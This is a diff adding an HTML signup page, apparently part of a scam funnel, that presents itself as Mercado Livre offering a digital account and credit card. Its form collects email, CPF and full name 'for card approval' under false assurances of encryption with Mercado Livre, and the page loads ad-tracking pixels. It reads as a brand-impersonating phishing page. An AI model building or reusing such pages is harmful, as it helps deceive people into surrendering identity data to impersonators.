@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mercado Livre - Cadastro</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script src="js/utmify-tracker.js"></script>
+    <script src="js/utmify-pixel-tiktok.js"></script>
+    <script src="js/tiktok-pixel-shop.js"></script>
+    <style>
+        .cad-page {
+            background: #fff;
+            min-height: calc(100vh - 56px);
+            padding: 0;
+        }
+
+        .terms-header {
+            text-align: center;
+            padding: 28px 20px 16px;
+        }
+
+        .terms-header h2 {
+            font-size: 22px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin-bottom: 8px;
+        }
+
+        .terms-header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .terms-list {
+            padding: 0 18px;
+        }
+
+        .term-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            background: #e8e8e8;
+            padding: 16px 14px;
+            border-radius: 14px;
+            margin-bottom: 12px;
+        }
+
+        .term-icon {
+            flex-shrink: 0;
+            width: 28px;
+            height: 28px;
+            color: #1a1a1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .term-icon svg {
+            display: block;
+        }
+
+        .term-text {
+            font-size: 14px;
+            color: #333;
+            line-height: 1.45;
+        }
+
+        .action-area {
+            padding: 22px 18px 28px;
+        }
+
+        .user-form {
+            display: none;
+            padding: 20px 18px 28px;
+        }
+
+        .form-hero-logo {
+            text-align: center;
+            margin-bottom: 18px;
+        }
+
+        .form-hero-logo img {
+            height: 180px;
+            width: auto;
+        }
+
+        .form-tagline {
+            font-size: 13px;
+            color: #888;
+            text-align: center;
+            margin-bottom: 18px;
+            line-height: 1.35;
+        }
+
+        .form-title {
+            font-size: 19px;
+            font-weight: 800;
+            color: #1a1a1a;
+            margin-bottom: 6px;
+        }
+
+        .form-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 22px;
+        }
+
+        .input-wrapper {
+            position: relative;
+            margin-bottom: 14px;
+        }
+
+        .input-wrapper label {
+            display: block;
+            font-size: 11px;
+            color: #888;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.04em;
+            font-weight: 600;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 14px 14px 14px 46px;
+            border: 1px solid #d0d0d0;
+            border-radius: 10px;
+            font-size: 16px;
+            outline: none;
+            background: #f3f3f3;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #3483fa;
+            box-shadow: 0 0 0 2px rgba(52, 131, 250, 0.15);
+        }
+
+        .input-wrapper input.input-error {
+            border-color: #f23d4d;
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 14px;
+            bottom: 14px;
+            width: 22px;
+            height: 22px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #6b5b95;
+            pointer-events: none;
+        }
+
+        .input-wrapper--cpf .input-icon {
+            color: #3483fa;
+        }
+
+        .field-error {
+            font-size: 12px;
+            color: #d93025;
+            margin: -8px 0 10px;
+            display: none;
+        }
+
+        .field-error.is-visible {
+            display: block;
+        }
+
+        .secure-badge {
+            background: #e8f8ec;
+            color: #1a5c2e;
+            padding: 14px 14px;
+            border-radius: 10px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            font-size: 12px;
+            line-height: 1.45;
+            margin-top: 18px;
+        }
+
+        .secure-badge svg {
+            flex-shrink: 0;
+            margin-top: 1px;
+            color: #3483fa;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="app-container app-container--funnel">
+        <header>
+            <a href="quiz.html" class="header-back" aria-label="Voltar">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                    <path d="M15 18L9 12L15 6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"
+                        stroke-linejoin="round"></path>
+                </svg>
+            </a>
+            <div class="header-logo">
+                <img src="images/Mercado-Livre-logo.png" alt="Mercado Livre" width="150" height="36">
+            </div>
+        </header>
+
+        <div class="cad-page">
+            <div id="termsArea">
+                <div class="terms-header">
+                    <h2>Conta digital e cartão de crédito</h2>
+                    <p>Tudo o que você precisa em um só lugar</p>
+                </div>
+
+                <div class="terms-list">
+                    <div class="term-item">
+                        <div class="term-icon" aria-hidden="true">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 3L4 6V12C4 16.2 7.1 20.1 12 21C16.9 20.1 20 16.2 20 12V6L12 3Z"
+                                    stroke="currentColor" stroke-width="1.35" stroke-linejoin="round"></path>
+                            </svg>
+                        </div>
+                        <div class="term-text">Crédito sujeito à análise e aprovação.</div>
+                    </div>
+                    <div class="term-item">
+                        <div class="term-icon" aria-hidden="true">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <ellipse cx="8" cy="7" rx="3" ry="2" stroke="currentColor" stroke-width="1.2"></ellipse>
+                                <ellipse cx="16" cy="7" rx="3" ry="2" stroke="currentColor" stroke-width="1.2">
+                                </ellipse>
+                                <ellipse cx="8" cy="12" rx="3" ry="2" stroke="currentColor" stroke-width="1.2">
+                                </ellipse>
+                                <ellipse cx="16" cy="12" rx="3" ry="2" stroke="currentColor" stroke-width="1.2">
+                                </ellipse>
+                                <ellipse cx="8" cy="17" rx="3" ry="2" stroke="currentColor" stroke-width="1.2">
+                                </ellipse>
+                                <ellipse cx="16" cy="17" rx="3" ry="2" stroke="currentColor" stroke-width="1.2">
+                                </ellipse>
+                            </svg>
+                        </div>
+                        <div class="term-text">Os dados fornecidos por você a seguir serão utilizados para o processo de
+                            aquisição do cartão de crédito.</div>
+                    </div>
+                    <div class="term-item">
+                        <div class="term-icon" aria-hidden="true">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none"
+                                xmlns="http://www.w3.org/2000/svg">
+                                <path d="M4 20H20V9H4V20Z" stroke="currentColor" stroke-width="1.25"
+                                    stroke-linejoin="round"></path>
+                                <path d="M9 9V5H15V9" stroke="currentColor" stroke-width="1.25" stroke-linejoin="round">
+                                </path>
+                                <path d="M4 13H20" stroke="currentColor" stroke-width="1.25"></path>
+                                <path d="M8 20V16H11V20" stroke="currentColor" stroke-width="1.1"></path>
+                            </svg>
+                        </div>
+                        <div class="term-text">Ao prosseguir, você concorda com os termos de uso e política de
+                            privacidade do Mercado Livre.</div>
+                    </div>
+                </div>
+
+                <div class="action-area">
+                    <button type="button" class="btn btn-yellow" onclick="showForm()">Li e concordo</button>
+                </div>
+            </div>
+
+            <div id="formArea" class="user-form">
+                <div class="form-hero-logo">
+                    <img src="images/anita.png" alt="Mercado Livre">
+                </div>
+                <p class="form-tagline">Conta digital e cartão de crédito em um só lugar.</p>
+
+                <h2 class="form-title">Preencha seus dados para a aprovação do seu cartão</h2>
+                <p class="form-subtitle">Leva menos de 1 minuto para concluir.</p>
+
+                <div class="input-wrapper">
+                    <label for="emailInput">Email</label>
+                    <span class="input-icon" aria-hidden="true">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M4 6H20V18H4V6Z" stroke="currentColor" stroke-width="1.3" stroke-linejoin="round">
+                            </path>
+                            <path d="M4 7L12 13L20 7" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"
+                                stroke-linejoin="round"></path>
+                        </svg>
+                    </span>
+                    <input type="email" id="emailInput" name="email" placeholder="seuemail@exemplo.com"
+                        autocomplete="email">
+                </div>
+                <p class="field-error" id="errEmail">Informe um e-mail válido.</p>
+
+                <div class="input-wrapper input-wrapper--cpf">
+                    <label for="cpfInput">CPF</label>
+                    <span class="input-icon" aria-hidden="true">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="4" y="6" width="16" height="12" rx="1.5" stroke="currentColor" stroke-width="1.25">
+                            </rect>
+                            <circle cx="9" cy="11" r="1.2" fill="currentColor"></circle>
+                            <path d="M12 11H16" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"></path>
+                        </svg>
+                    </span>
+                    <input type="text" id="cpfInput" name="cpf" placeholder="000.000.000-00" maxlength="14"
+                        inputmode="numeric" autocomplete="off" oninput="this.value = formatCPF(this.value)">
+                </div>
+                <p class="field-error" id="errCpf">Informe um CPF com 11 dígitos.</p>
+
+                <div class="input-wrapper">
+                    <label for="nomeInput">Nome completo</label>
+                    <span class="input-icon" aria-hidden="true">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="12" cy="8" r="3.2" stroke="currentColor" stroke-width="1.25"></circle>
+                            <path d="M6 19C6 15 9 13 12 13C15 13 18 15 18 19" stroke="currentColor" stroke-width="1.25"
+                                stroke-linecap="round"></path>
+                        </svg>
+                    </span>
+                    <input type="text" id="nomeInput" name="nome" placeholder="Nome completo" autocomplete="name">
+                </div>
+                <p class="field-error" id="errNome">Informe seu nome completo.</p>
+
+                <button type="button" class="btn btn-yellow mt-20" onclick="submitCadastro()">Continuar</button>
+
+                <div class="secure-badge">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"
+                        aria-hidden="true">
+                        <path d="M12 3L4 6V12C4 16.2 7.1 20.1 12 21C16.9 20.1 20 16.2 20 12V6L12 3Z"
+                            stroke="currentColor" stroke-width="1.35" stroke-linejoin="round"></path>
+                    </svg>
+                    <span>Todas as informações são criptografadas e estão seguras conosco no Mercado Livre.</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/script.js"></script>
+    <script>
+        function showForm() {
+            document.getElementById("termsArea").style.display = "none";
+            document.getElementById("formArea").style.display = "block";
+            window.scrollTo(0, 0);
+        }
+
+        function clearFieldErrors() {
+            document.querySelectorAll(".field-error").forEach(function (el) {
+                el.classList.remove("is-visible");
+            });
+            var ec = document.getElementById("errCpf");
+            var en = document.getElementById("errNome");
+            if (ec) ec.textContent = "Informe um CPF válido (11 dígitos).";
+            if (en) en.textContent = "Informe seu nome completo (nome e sobrenome).";
+            document.querySelectorAll(".input-wrapper input").forEach(function (el) {
+                el.classList.remove("input-error");
+            });
+        }
+
+        function submitCadastro() {
+            clearFieldErrors();
+            var email = document.getElementById("emailInput").value.trim();
+            var cpf = document.getElementById("cpfInput").value;
+            var nome = document.getElementById("nomeInput").value.trim();
+            var ok = true;
+
+            if (!isValidEmail(email)) {
+                document.getElementById("errEmail").classList.add("is-visible");
+                document.getElementById("emailInput").classList.add("input-error");
+                ok = false;
+            }
+            var errCpfV = validarCpfBr(cpf);
+            if (errCpfV) {
+                document.getElementById("errCpf").textContent = errCpfV;
+                document.getElementById("errCpf").classList.add("is-visible");
+                document.getElementById("cpfInput").classList.add("input-error");
+                ok = false;
+            }
+            var errNomeV = validarNomeCompleto(nome);
+            if (errNomeV) {
+                document.getElementById("errNome").textContent = errNomeV;
+                document.getElementById("errNome").classList.add("is-visible");
+                document.getElementById("nomeInput").classList.add("input-error");
+                ok = false;
+            }
+            if (!ok) return;
+
+            try {
+                sessionStorage.setItem("mlNome", nome);
+                sessionStorage.setItem("mlEmail", email);
+                sessionStorage.setItem("mlCpf", cpfDigits(cpf));
+            } catch (e) { }
+
+            window.location.href = "../personalizar/index.html";
+        }
+    </script>
+
+
+</body>
+
+</html>
